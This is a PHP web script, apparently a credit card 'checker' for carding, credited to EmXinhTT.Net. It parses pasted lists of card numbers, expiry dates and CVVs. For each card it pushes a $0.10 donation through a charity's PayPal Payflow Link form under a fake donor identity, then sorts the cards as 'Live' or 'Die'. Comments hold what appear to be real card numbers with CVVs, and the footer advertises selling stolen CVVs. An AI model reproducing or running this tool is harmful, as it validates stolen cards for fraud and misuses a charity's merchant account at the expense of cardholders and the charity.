<?php
session_start();
?>
<html>
<head><title>--[ Search BIN Info - Code by EmXinhTT.Net ]--</title>
<link rel="stylesheet" type="text/css" href="default1.css">
</style>
</head>
<body>
<center>
<?
set_time_limit(0);

function check($ccnum,$ccv2,$moth,$year)
{


$header_array[0] ="Host:payflowlink.paypal.com";
$header_array[1]= "User-Agent:Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11";
$header_array[2]= "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
$header_array[3]= "Accept-Language:en-us,en;q=0.5";
//$header_array[4]= "Accept-Encoding:gzip,deflate";
$header_array[5]= "Accept-Charset:ISO-8859-1,utf-8;q=0.7,*;q=0.7";
$header_array[6]= "Keep-Alive:300";
//$header_array[7]= "Cookie:V5PFLSESSIONID=Jq3jMrLRHMTW1r4ddTQ3KdC57DxJ1DlTxMNpvD2BDnlysZPWQJ8J!224590681!-1907224927";
$header_array[8]= "Content-Type:application/x-www-form-urlencoded";
$header_array[9]= "Content-Length:1810";
//4011740009301292 | 01 | 2011 | 266 | 

//$ccnum='4011740009301292';
//$ccv2='266';
//$moth='01';
//$year='2011';


$cookie_file_path = dirname(__FILE__).'/daicomvll.txt';
				$fp = fopen($cookie_file_path,'wb');    
				fclose($fp);
	
	$agent="Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.10) Gecko/20100504 Firefox/3.5.10";
$url='https://payflowlink.paypal.com/';
//$reffer='https://payflowlink.paypal.com/confirm.do';
//$POSTFIELDS='PARTNER=paypal&LOGIN=ayalausa&AMOUNT=0.10&SHOWCONFIRM=TRUE&METHOD=C&TYPE=S&EMAILCUSTOMER=&EMAILMERCHANT=&SILENTTRAN=&SHIPAMOUNT=&RETURNURL=&TAX=&CARDNUM=4185873155582868&ACCOUNT=&ABANUM=&EXPDATE=1210&CSC=171&ABA=&ACCT=&SSN=&NAME=Donni+Cochran&ADDRESS=PO+Box+571&CITY=Glenwood+Springs&STATE=Colorado&ZIP=81602&COUNTRY=USA&PHONE=&FAX=&EMAIL=dsfsdff%40gmail.com&NAMETOSHIP=&ADDRESSTOSHIP=&CITYTOSHIP=&STATETOSHIP=&ZIPTOSHIP=&COUNTRYTOSHIP=&PHONETOSHIP=&FAXTOSHIP=&EMAILTOSHIP=&ORIGID=&COMMENT1=&COMMENT2=&USER1=&USER2=&USER3=&USER4=&USER5=&USER6=&USER7=&USER8=&USER9=&USER10=&NAME_FLAG=3&ADDR_FLAG=3&CITY_FLAG=3&STATE_FLAG=3&ZIP_FLAG=3&COUNTRY_FLAG=2&PHONE_FLAG=2&EMAIL_FLAG=3&CVV2_FLAG=3&NAMETOSHIP_FLAG=0&ADDRTOSHIP_FLAG=0&CITYTOSHIP_FLAG=0&STATETOSHIP_FLAG=0&ZIPTOSHIP_FLAG=0&COUNTRYTOSHIP_FLAG=0&PHONETOSHIP_FLAG=0&EMAILTOSHIP_FLAG=0&ORDERFORM=TRUE&INVOICE=OK&DESCRIPTION=Abotlangit+Association+for+Green+Development%2C+Inc.&PONUM=&TRANSID=&DISABLERECEIPT=&ECHODATA=&CUSTID=&MICR=&CHECKNUM=&STATEOFDL=&DLNUM=&TYPEOFCHECK=&CARDTYPE=VI&ORIGCARDNUM=&CARDTYPE_FULLNAME=&flag3dSecure=&RETURNMETHOD=1&DISPNAME=Ayala+Foundation+-+USA&BACKCOLOR=0066CC&RECEIPTHEADER=Ayala+Foundation+-+USA&RECEIPTFOOTER=%A9+2008+AyalaFoundation-USA+All+rights+reserved&BUTTONTEXT=Back+to+Ayala+Foundation+-+USA&CUSTEMAIL=&MERCHADDR1=marivi.padilla%40gmail.com&MERCHADDR2=alaban.ws%40ayalafoundation.org&EMAILHEADER=Ayala+Foundation+-+USA%0D%0A%0D%0AThank+you+for+your+donation+to+Ayala+Foundation+USA%21+Here+are+the+details+of+your+online+donation+for+your+records%3A%0D%0A&EMAILFOOTER=If+you+have+any+concerns+regarding+this+transaction%2C+please+contact+us+at+650-598-3126+or+email+info%40af-usa.org.%0D%0A%0D%0A%A9+2008+AyalaFoundation-USA+All+rights+reserved&POSTURL=&JUSTIFY=1&FAILEDURL=&submit=Submit+Transaction+For+Processing';

$POSTFIELDS='LOGIN=ayalausa&PARTNER=paypal&AMOUNT=0.1&rb_AMOUNT=other&oth_amt=0.1&DESCRIPTION=Adaptive+Technology+for+Rehabilitation%2C+Integration+and+Empowerment+of+the+Visually+Impaired+%28ATRIEV%29&NAME=Donni+Cochran&ADDRESS=PO+Box+571&CITY=Glenwood+Springs&STATE=Colorado&COUNTRY=USA&ZIP=81602&PHONE=9704796262&EMAIL=lalala%40gmail.com&waiver=Agree&Submit_btn=Submit&TYPE=S&INVOICE=OK';

$ch = curl_init();    
	curl_setopt($ch, CURLOPT_URL, $url);  
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);  
	//curl_setopt($ch, CURLOPT_HTTPHEADER, $header_array); 
	curl_setopt($ch,CURLOPT_POST,1);
	curl_setopt($ch,CURLOPT_POSTFIELDS,$POSTFIELDS);
	curl_setopt($ch, CURLOPT_REFERER, $reffer); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 	
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path); 
	$result = curl_exec($ch);  // grab URL and pass it to the variable.  
	curl_close($ch);  // close curl resource, and free up system resources. 
	//echo $result;




$url='https://payflowlink.paypal.com/confirm.do';
//$reffer='https://payflowlink.paypal.com/confirm.do';
//$POSTFIELDS='PARTNER=paypal&LOGIN=ayalausa&AMOUNT=0.10&SHOWCONFIRM=TRUE&METHOD=C&TYPE=S&EMAILCUSTOMER=&EMAILMERCHANT=&SILENTTRAN=&SHIPAMOUNT=&RETURNURL=&TAX=&CARDNUM=4185873155582868&ACCOUNT=&ABANUM=&EXPDATE=1210&CSC=171&ABA=&ACCT=&SSN=&NAME=Donni+Cochran&ADDRESS=PO+Box+571&CITY=Glenwood+Springs&STATE=Colorado&ZIP=81602&COUNTRY=USA&PHONE=&FAX=&EMAIL=dsfsdff%40gmail.com&NAMETOSHIP=&ADDRESSTOSHIP=&CITYTOSHIP=&STATETOSHIP=&ZIPTOSHIP=&COUNTRYTOSHIP=&PHONETOSHIP=&FAXTOSHIP=&EMAILTOSHIP=&ORIGID=&COMMENT1=&COMMENT2=&USER1=&USER2=&USER3=&USER4=&USER5=&USER6=&USER7=&USER8=&USER9=&USER10=&NAME_FLAG=3&ADDR_FLAG=3&CITY_FLAG=3&STATE_FLAG=3&ZIP_FLAG=3&COUNTRY_FLAG=2&PHONE_FLAG=2&EMAIL_FLAG=3&CVV2_FLAG=3&NAMETOSHIP_FLAG=0&ADDRTOSHIP_FLAG=0&CITYTOSHIP_FLAG=0&STATETOSHIP_FLAG=0&ZIPTOSHIP_FLAG=0&COUNTRYTOSHIP_FLAG=0&PHONETOSHIP_FLAG=0&EMAILTOSHIP_FLAG=0&ORDERFORM=TRUE&INVOICE=OK&DESCRIPTION=Abotlangit+Association+for+Green+Development%2C+Inc.&PONUM=&TRANSID=&DISABLERECEIPT=&ECHODATA=&CUSTID=&MICR=&CHECKNUM=&STATEOFDL=&DLNUM=&TYPEOFCHECK=&CARDTYPE=VI&ORIGCARDNUM=&CARDTYPE_FULLNAME=&flag3dSecure=&RETURNMETHOD=1&DISPNAME=Ayala+Foundation+-+USA&BACKCOLOR=0066CC&RECEIPTHEADER=Ayala+Foundation+-+USA&RECEIPTFOOTER=%A9+2008+AyalaFoundation-USA+All+rights+reserved&BUTTONTEXT=Back+to+Ayala+Foundation+-+USA&CUSTEMAIL=&MERCHADDR1=marivi.padilla%40gmail.com&MERCHADDR2=alaban.ws%40ayalafoundation.org&EMAILHEADER=Ayala+Foundation+-+USA%0D%0A%0D%0AThank+you+for+your+donation+to+Ayala+Foundation+USA%21+Here+are+the+details+of+your+online+donation+for+your+records%3A%0D%0A&EMAILFOOTER=If+you+have+any+concerns+regarding+this+transaction%2C+please+contact+us+at+650-598-3126+or+email+info%40af-usa.org.%0D%0A%0D%0A%A9+2008+AyalaFoundation-USA+All+rights+reserved&POSTURL=&JUSTIFY=1&FAILEDURL=&submit=Submit+Transaction+For+Processing';

$POSTFIELDS='CARDNUM='.$ccnum.'&EXPMONTH='.$moth.'&EXPYEAR='.$year.'&CVV2='.$ccv2.'&NAME=Donni+Cochran&ADDRESS=PO+Box+571&CITY=Glenwood+Springs&STATE=Colorado&ZIP=81602&COUNTRY=USA&PHONE=9704796262&EMAIL=lalala%40gmail.com&submit=I+Authorize+this+transaction&PARTNER=paypal&LOGIN=ayalausa&AMOUNT=0.10&SHOWCONFIRM=TRUE&METHOD=C&TYPE=S&EMAILCUSTOMER=&EMAILMERCHANT=&SILENTTRAN=&SHIPAMOUNT=&RETURNURL=&TAX=&CARDNUM=4335380590001503&ACCOUNT=&ABANUM=&EXPDATE=0810&CSC=&ABA=&ACCT=&SSN=&ORIGID=&COMMENT1=&COMMENT2=&USER1=&USER2=&USER3=&USER4=&USER5=&USER6=&USER7=&USER8=&USER9=&USER10=&FAX=&FAXTOSHIP=&NAME_FLAG=3&ADDR_FLAG=3&CITY_FLAG=3&STATE_FLAG=3&ZIP_FLAG=3&COUNTRY_FLAG=2&PHONE_FLAG=2&EMAIL_FLAG=3&CVV2_FLAG=3&NAMETOSHIP_FLAG=0&ADDRTOSHIP_FLAG=0&CITYTOSHIP_FLAG=0&STATETOSHIP_FLAG=0&ZIPTOSHIP_FLAG=0&COUNTRYTOSHIP_FLAG=0&PHONETOSHIP_FLAG=0&EMAILTOSHIP_FLAG=0&ORDERFORM=TRUE&INVOICE=OK&DESCRIPTION=Adaptive+Technology+for+Rehabilitation%2C+Integration+and+Empowerment+of+the+Visually+Impaired+%28ATRIEV%29&PONUM=&TRANSID=&DISABLERECEIPT=&ECHODATA=&CUSTID=&MICR=&CHECKNUM=&STATEOFDL=&DLNUM=&TYPEOFCHECK=&CARDTYPE=VI&ORIGCARDNUM=&CARDTYPE_FULLNAME=&flag3dSecure=&RETURNMETHOD=1&DISPNAME=Ayala+Foundation+-+USA&BACKCOLOR=0066CC&RECEIPTHEADER=Ayala+Foundation+-+USA&RECEIPTFOOTER=%A9+2008+AyalaFoundation-USA+All+rights+reserved&BUTTONTEXT=Back+to+Ayala+Foundation+-+USA&CUSTEMAIL=&MERCHADDR1=marivi.padilla%40gmail.com&MERCHADDR2=alaban.ws%40ayalafoundation.org&EMAILHEADER=Ayala+Foundation+-+USA%0D%0A%0D%0AThank+you+for+your+donation+to+Ayala+Foundation+USA%21+Here+are+the+details+of+your+online+donation+for+your+records%3A%0D%0A&EMAILFOOTER=If+you+have+any+concerns+regarding+this+transaction%2C+please+contact+us+at+650-598-3126+or+email+info%40af-usa.org.%0D%0A%0D%0A%A9+2008+AyalaFoundation-USA+All+rights+reserved&POSTURL=&JUSTIFY=1&FAILEDURL=';

$ch = curl_init();    
	curl_setopt($ch, CURLOPT_URL, $url);  
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);  
	//curl_setopt($ch, CURLOPT_HTTPHEADER, $header_array); 
	curl_setopt($ch,CURLOPT_POST,1);
	curl_setopt($ch,CURLOPT_POSTFIELDS,$POSTFIELDS);
	curl_setopt($ch, CURLOPT_REFERER, $reffer); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 	
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path); 
	$result = curl_exec($ch);  // grab URL and pass it to the variable.  
	curl_close($ch);  // close curl resource, and free up system resources. 
	//echo $result;






	$agent="Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.10) Gecko/20100504 Firefox/3.5.10";
$url='https://payflowlink.paypal.com/submitTransaction.do';
$reffer='https://payflowlink.paypal.com/confirm.do';
$POSTFIELDS='PARTNER=paypal&LOGIN=ayalausa&AMOUNT=0.10&SHOWCONFIRM=TRUE&METHOD=C&TYPE=S&EMAILCUSTOMER=&EMAILMERCHANT=&SILENTTRAN=&SHIPAMOUNT=&RETURNURL=&TAX=&CARDNUM='.$ccnum.'&ACCOUNT=&ABANUM=&EXPDATE='.$moth.substr($year,2,2).'&CSC='.$ccv2.'&ABA=&ACCT=&SSN=&NAME=Donni+Cochran&ADDRESS=PO+Box+571&CITY=Glenwood+Springs&STATE=Colorado&ZIP=81602&COUNTRY=USA&PHONE=&FAX=&EMAIL=dsfsdff%40gmail.com&NAMETOSHIP=&ADDRESSTOSHIP=&CITYTOSHIP=&STATETOSHIP=&ZIPTOSHIP=&COUNTRYTOSHIP=&PHONETOSHIP=&FAXTOSHIP=&EMAILTOSHIP=&ORIGID=&COMMENT1=&COMMENT2=&USER1=&USER2=&USER3=&USER4=&USER5=&USER6=&USER7=&USER8=&USER9=&USER10=&NAME_FLAG=3&ADDR_FLAG=3&CITY_FLAG=3&STATE_FLAG=3&ZIP_FLAG=3&COUNTRY_FLAG=2&PHONE_FLAG=2&EMAIL_FLAG=3&CVV2_FLAG=3&NAMETOSHIP_FLAG=0&ADDRTOSHIP_FLAG=0&CITYTOSHIP_FLAG=0&STATETOSHIP_FLAG=0&ZIPTOSHIP_FLAG=0&COUNTRYTOSHIP_FLAG=0&PHONETOSHIP_FLAG=0&EMAILTOSHIP_FLAG=0&ORDERFORM=TRUE&INVOICE=OK&DESCRIPTION=Abotlangit+Association+for+Green+Development%2C+Inc.&PONUM=&TRANSID=&DISABLERECEIPT=&ECHODATA=&CUSTID=&MICR=&CHECKNUM=&STATEOFDL=&DLNUM=&TYPEOFCHECK=&CARDTYPE=VI&ORIGCARDNUM=&CARDTYPE_FULLNAME=&flag3dSecure=&RETURNMETHOD=1&DISPNAME=Ayala+Foundation+-+USA&BACKCOLOR=0066CC&RECEIPTHEADER=Ayala+Foundation+-+USA&RECEIPTFOOTER=%A9+2008+AyalaFoundation-USA+All+rights+reserved&BUTTONTEXT=Back+to+Ayala+Foundation+-+USA&CUSTEMAIL=&MERCHADDR1=marivi.padilla%40gmail.com&MERCHADDR2=alaban.ws%40ayalafoundation.org&EMAILHEADER=Ayala+Foundation+-+USA%0D%0A%0D%0AThank+you+for+your+donation+to+Ayala+Foundation+USA%21+Here+are+the+details+of+your+online+donation+for+your+records%3A%0D%0A&EMAILFOOTER=If+you+have+any+concerns+regarding+this+transaction%2C+please+contact+us+at+650-598-3126+or+email+info%40af-usa.org.%0D%0A%0D%0A%A9+2008+AyalaFoundation-USA+All+rights+reserved&POSTURL=&JUSTIFY=1&FAILEDURL=&submit=Submit+Transaction+For+Processing';

//$POSTFIELDS='LOGIN=ayalausa&PARTNER=paypal&AMOUNT=0.1&rb_AMOUNT=other&oth_amt=0.1&DESCRIPTION=Adaptive+Technology+for+Rehabilitation%2C+Integration+and+Empowerment+of+the+Visually+Impaired+%28ATRIEV%29&NAME=Donni+Cochran&ADDRESS=PO+Box+571&CITY=Glenwood+Springs&STATE=Colorado&COUNTRY=USA&ZIP=81602&PHONE=9704796262&EMAIL=lalala%40gmail.com&waiver=Agree&Submit_btn=Submit&TYPE=S&INVOICE=OK';

$ch = curl_init();    
	curl_setopt($ch, CURLOPT_URL, $url);  
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);  
	//curl_setopt($ch, CURLOPT_HTTPHEADER, $header_array); 
	curl_setopt($ch,CURLOPT_POST,1);
	curl_setopt($ch,CURLOPT_POSTFIELDS,$POSTFIELDS);
	curl_setopt($ch, CURLOPT_REFERER, $reffer); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 	
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path); 
	$result = curl_exec($ch);  // grab URL and pass it to the variable.  
	curl_close($ch);  // close curl resource, and free up system resources. 
//echo $result;

$code_ok=3;
if(strpos($result,'Thank you for your purchase') || strpos($result,'Your transaction was approved') )
{
//echo 'live';
		//return 1;
		
		$code_ok=1;
}
if(strpos($result,'were unable to process your transaction due to one of the following reasons'))
{
//echo 'die';
		$code_ok=2;
}

return $code_ok;

}


function _date($cclist){
    if (!is_null($cclist)){
        foreach ($cclist as $cc){
            $ccnum = info($cc);
            if ($ccnum){
                $_d = $ccnum['year'].$ccnum['mon'];
                $order[$_d][] = $cc;
            }
            else $order['e'][] = $cc;
        }
        ksort($order);
        if (!is_null($order)) foreach ($order as $_d) foreach ($_d as $cc) $ok[] = $cc;
        if (!is_null($order['e'])) foreach ($order['e'] as $cc) $ok[]=$cc;
        return $ok;
    }
}

function _bin($ccnum){
    if (isset($_POST['bin'])){
        $blen = strlen($_POST['bin']);
        $bin = substr($ccnum['num'],0,$blen);
        if ($bin == $_POST['bin']) return true;
        else return false;
    }
    else return true;
}

function _dup($cclist){
    for ($i = 0;$i < count($cclist); $i++){
        $ccnum = info($cclist[$i]);
        if ($ccnum){
            $cc = $ccnum['num'];
            for ($j = $i + 1;$j < count($cclist); $j++){
                if (inStr(str_replace("-","",str_replace(" ","",$cclist[$j])),$cc)) $cclist[$j] = "";
            }
        }
    }
    foreach($cclist as $i => $cc) if ($cc == "") unset($cclist[$i]);
    $ok = array_values($cclist);
    return $ok;
}

function _type($cclist){
    foreach ($cclist as $cc){
        $ccnum = info($cc);
        $_d = $ccnum['type'];
        switch ($_d){
            case "VISA":
                $order['v'][] = $cc;
            break;
            case "Mastercard":
                $order['m'][] = $cc;
            break;
            case "American+Express":
                $order['a'][] = $cc;
            break;
            case "Discover":
                $order['d'][] = $cc;
            break;
        }
    }
    return $order;
}

function info($ccline){
  $xy = array("|","\\","/","-",";");
  $sepe = $xy[0];
  foreach($xy as $v){
      if (substr_count($ccline,$sepe) < substr_count($ccline,$v)) $sepe = $v;
  }
  $x = explode($sepe,$ccline);
  foreach($xy as $y) $x = str_replace($y,"",str_replace(" ","",$x));
  foreach ($x as $xx){
      $xx = trim($xx);
         if (is_numeric($xx)){
             $yy=strlen($xx);
             switch ($yy){
                 case 15:
                     if (substr($xx,0,1)==3){
                         $ccnum['num'] = $xx;
                         $ccnum['type'] = "American+Express";
                    }
                     break;
                 case 16:
                     switch (substr($xx,0,1)){
                          case '4':
                             $ccnum['num']=$xx;
                             $ccnum['type'] = "Visa";
                             break;
                        case '5':
                             $ccnum['num']=$xx;
                             $ccnum['type'] = "Mastercard";
                             break;
                         case '6':
                             $ccnum['num']=$xx;
                             $ccnum['type'] = "Discover";
                             break;
                     }
                     break;
                 case 1:
                     if (($xx >= 1) and ($xx <=12) and (!isset($ccnum['mon']))) $ccnum['mon'] = "0".$xx;
                 case 2:
                     if (($xx >= 1) and ($xx <=12) and (!isset($ccnum['mon'])))    $ccnum['mon'] = $xx;
                     elseif (($xx >= 9) and ($xx <= 19) and (isset($ccnum['mon'])) and (!isset($ccnum['year'])))    $ccnum['year'] = "20".$xx;
                     break;
                 case 4:
                     if (($xx >= 2009) and ($xx <= 2019) and (isset($ccnum['mon'])))    $ccnum['year'] = $xx;
                     elseif ((substr($xx,0,2) >= 1) and (substr($xx,0,2) <=12) and (substr($xx,2,2)>= 9) and (substr($xx,2,2) <= 19) and (!isset($ccnum['mon'])) and (!isset($ccnum['year']))){
                             $ccnum['mon'] = substr($xx,0,2);
                             $ccnum['year'] = "20".substr($xx,2,2);
                         }
                     else $ccv['cv4'] = $xx;
                     break;
                 case 6:
                     if ((substr($xx,0,2) >= 1) and (substr($xx,0,2) <=12) and (substr($xx,2,4)>= 2009) and (substr($xx,2,4) <= 2019)){
                        $ccnum['mon'] = substr($xx,0,2);
                        $ccnum['year'] = substr($xx,2,4);
                    }
                    break;
                case 3:
                    $ccv['cv3'] = $xx;
                    break;

              }
          }
          }
    if (isset($ccnum['num']) and isset($ccnum['mon']) and isset($ccnum['year'])){
            if ($ccnum['type'] == "American+Express") $ccnum['cvv'] = $ccv['cv4'];
            else $ccnum['cvv'] = $ccv['cv3'];
        return $ccnum;
    }
    else return false;
}

function inStr($s,$as){
    $s=strtoupper($s);
    if(!is_array($as)) $as=array($as);

    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
}

function percent($num_amount, $num_total) {
$count1 = $num_amount / $num_total;
$count2 = $count1 * 100;
$count = number_format($count2, 0);
return $count;
}

if ($_POST['cclist']){

    $cclist = trim($_POST['cclist']);
    $cclist = str_replace(array("\\\"","\\'"),array("\"","'"),$cclist);
    $cclist = str_replace("\n\n","\n",$cclist);
    $cclist = explode("\n",$cclist);
    if (isset($_POST['dup'])) $cclist = _dup($cclist);
    $relog = 0;
	$tongso=count($cclist);
    foreach ($cclist as $ccline){
        $relog++;
        $ccnum = info($ccline);
        if ($ccnum){
            if (_bin($ccnum)){
                $post = "ACTION=&credit_card=".$ccnum['type']."&card_number=".$ccnum['num']."&card_cvv_number=".$ccnum['cvv']."&MONTH=".($ccnum['mon'])."&YEAR=".($ccnum['year']);

				$okokok=check($ccnum['num'],$ccnum['cvv'],$ccnum['mon'],$ccnum['year']);
				//echo $post.'<br>';
				
				
				
				    if ($okokok==1){
                        echo $relog."/".$tongso.".<font color=green>Live | ".$ccline."</font><br>";
                        $cc['l'][] = $ccline;
                    }
                    if($okokok==2)
					{
                        echo $relog."/".$tongso.".<font color=red>Die | ".$ccline."</font><br>";
                        $cc['d'][] = $ccline;
                    }
				 if($okokok==4)
				 {
					echo $relog."/".$tongso.".<font color=black>CantCheck | ".$ccline."</font><br>";
					$cc['c'][] = $ccline;
                 }
				 if($okokok==3)
				 {
					echo $relog."/".$tongso.".<font color=black>Unknow | ".$ccline."</font><br>";
					$cc['u'][] = $ccline;
                 }
                
            }
        }
        else{
            echo $relog."/".$tongso.".<font color=black>Line_Error | ".$ccline."</font><br>";
            $cc['e'][] = $ccline;
        }
        flush();
    }
    ?>
    <? if (!is_null($cc['l'])){?>
    <? if (isset($_POST['date'])) $cc['l'] = _date($cc['l']); ?>
    <?     $xx = percent(count($cc['l']),count($cclist));
            echo "<center><font color=green><strong>LIVE: ".count($cc['l'])." ~ $xx %</strong></center><br>"; ?>
    <body text="#FFFFFF" bgcolor="#000000">

    <center><textarea wrap="off" rows=10 style="width:90%"><? foreach ($cc['l'] as $ss) echo $ss."\n"; ?></textarea></center><br>
    <? if ($_POST['type']) {
        $count = count($cc['l']);
        $cc['l'] = _type($cc['l']);?>
    <? if (!is_null($cc['l']['v'])){?>
        <?     $xx = percent(count($cc['l']['v']),$count);
                echo "<center><font color=red><strong>VISA: ".count($cc['l']['v'])." ~ $xx %</strong></center><br>"; ?>
                <center><textarea wrap="off" rows=10 style="width:90%;"><? foreach ($cc['l']['v'] as $ss) echo $ss."\n"; ?></textarea></center><br>
        <? } ?>
    <? if (!is_null($cc['l']['m'])){?>
        <?     $xx = percent(count($cc['l']['m']),$count);
                echo "<center><font color=red><strong>MASTER: ".count($cc['l']['m'])." ~ $xx %</strong></center><br>"; ?>
                <center><textarea wrap="off" rows=10 style="width:90%"><? foreach ($cc['l']['m'] as $ss) echo $ss."\n"; ?></textarea></center><br>
        <? } ?>
    <? if (!is_null($cc['l']['a'])){?>
        <?     $xx = percent(count($cc['l']['a']),$count);
                echo "<center><font color=red><strong>AMEX: ".count($cc['l']['a'])." ~ $xx %</strong></center><br>"; ?>
                <center><textarea wrap="off" rows=10 style="width:90%"><? foreach ($cc['l']['a'] as $ss) echo $ss."\n"; ?></textarea></center><br>
        <? } ?>
    <? if (!is_null($cc['l']['d'])){?>
        <?     $xx = percent(count($cc['l']['d']),$count);
                echo "<center><font color=red><strong>DISC: ".count($cc['l']['d'])." ~ $xx %</strong></center><br>"; ?>
                <center><textarea wrap="off" rows=10 style="width:90%"><? foreach ($cc['l']['d'] as $ss) echo $ss."\n"; ?></textarea></center><br>
        <? } ?>
    <? } ?>
    <? } ?>
    <? if (!is_null($cc['d'])){?>
    <?     $xx = percent(count($cc['d']),count($cclist));
            echo "<center><font color=green><strong>DIE: ".count($cc['d'])." ~ $xx %</strong></center><br>"; ?>
    <center><textarea wrap="off" rows=10 style="width:90%"><? foreach ($cc['d'] as $ss) echo $ss."\n"; ?></textarea></center><br>
    <? } ?>
    <? if (!is_null($cc['i'])){?>
    <?     $xx = percent(count($cc['i']),count($cclist));
            echo "<center><font color=green><strong>CCInvaid: ".count($cc['i'])." ~ $xx %</strong></center><br>"; ?>
    <center><textarea wrap="off" rows=10 style="width:90%"><? foreach ($cc['i'] as $ss) echo $ss."\n"; ?></textarea></center><br>
    <? } ?>
    <? if (!is_null($cc['c'])){?>
    <?     $xx = percent(count($cc['c']),count($cclist));
            echo "<center><font color=green><strong>Can't Check: ".count($cc['c'])." ~ $xx %</strong></center><br>"; ?>
    <center><textarea wrap="off" rows=10 style="width:90%"><? foreach ($cc['c'] as $ss) echo $ss."\n"; ?></textarea></center><br>
    <? } ?>
	
	<? if (!is_null($cc['u'])){?>
    <?     $xx = percent(count($cc['u']),count($cclist));
            echo "<center><font color=green><strong>Un known: ".count($cc['u'])." ~ $xx %</strong></center><br>"; ?>
    <center><textarea wrap="off" rows=10 style="width:90%"><? foreach ($cc['u'] as $ss) echo $ss."\n"; ?></textarea></center><br>
    <? } ?>
	
	
    <? if (!is_null($cc['e'])){?>
    <?     $xx = percent(count($cc['e']),count($cclist));
            echo "<center><font color=green><strong>LINE ERROR: ".count($cc['e'])." ~ $xx %</strong></center><br>"; ?>
    <center><textarea wrap="off" rows=10 style="width:90%"><? foreach ($cc['e'] as $ss) echo $ss."\n"; ?></textarea></center><br>
    <? } ?>
	
    <?
}else {
?>
<html>
<center><h1>--[ Code by Emxinhtt.Net ]--</h1>
    <form action="" method=post>
        <textarea wrap="off" name=cclist style="width:90%;height:50%"></textarea><br>
            Duplicate Remove: <input name=dup type=checkbox value=1 checked> Sort by type: <input name=type type=checkbox value=1 checked><br>
            Xep theo Date: <input name=date type=checkbox value=1 checked> Chi check BIN: <input type=text name=bin MAXLENGTH=6 size=8 style="text-align:center"><br>
        <input type=submit name=submit value="Check Now!"></form><br>Sell cvv US, Inter, EU<br>
Contact Y!M : vn_z1 &amp; <br>
<? } ?>
</center>
</html>
